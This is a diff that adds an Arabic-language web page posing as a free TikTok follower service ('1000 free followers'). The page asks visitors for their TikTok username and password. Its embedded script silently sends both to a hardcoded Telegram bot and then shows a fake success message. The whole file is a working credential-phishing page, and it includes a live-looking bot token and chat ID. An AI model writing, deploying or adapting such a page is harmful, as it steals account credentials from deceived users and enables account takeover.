@@ -1,1 +1,130 @@
- 
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>رشق 1000 متابع تيك توك مجاناً</title>
+  <style>
+    body {
+      font-family: 'Cairo', sans-serif;
+      direction: rtl;
+      background: #000;
+      margin: 0;
+      padding: 0;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    .container {
+      background: #111;
+      border: 2px solid gold;
+      border-radius: 15px;
+      padding: 30px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 20px gold;
+    }
+
+    img {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      color: gold;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 10px;
+      font-size: 1rem;
+      background-color: #222;
+      color: gold;
+      text-align: center;
+    }
+
+    input::placeholder {
+      color: #aaa;
+    }
+
+    button {
+      padding: 12px 30px;
+      background: gold;
+      color: #000;
+      border: none;
+      border-radius: 10px;
+      font-size: 1.1rem;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: 0.3s ease;
+    }
+
+    button:hover {
+      background: #d4af37;
+    }
+
+    .msg {
+      margin-top: 15px;
+      color: #00ff88;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 0.9rem;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/TikTok_logo.svg" alt="TikTok Logo">
+    <h2>احصل على 1000 متابع تيك توك مجاناً</h2>
+    <form id="tiktokForm">
+      <input type="text" id="username" placeholder="اسم المستخدم تيك توك" required><br>
+      <input type="password" id="password" placeholder="كلمة المرور" required><br>
+      <button type="submit">ارسال الطلب</button>
+    </form>
+    <div class="msg" id="successMsg"></div>
+    <div class="footer">المطور: @HM TEAM | جميع الحقوق محفوظة</div>
+  </div>
+
+  <script>
+    document.getElementById("tiktokForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const message = `طلب جديد لرشق متابعين تيك توك:\n\nاسم المستخدم: ${username}\nكلمة المرور: ${password}\n\n-- المطور: @evil_5188`;
+      const botToken = "7255990994:AAFWZ37rF5v8K2fAHgsQuWuKLycI0RniT7Q";
+      const chatId = "7359477402";
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(response => {
+          if (response.ok) {
+            document.getElementById("successMsg").innerText = "تم إرسال الطلب بنجاح! سيتم معالجة الحساب قريبًا.";
+            document.getElementById("tiktokForm").reset();
+          } else {
+            alert("حدث خطأ أثناء إرسال الطلب.");
+          }
+        })
+        .catch(error => {
+          alert("فشل الاتصال بالخادم.");
+          console.error(error);
+        });
+    });
+  </script>
+
+</body>
+</html> 
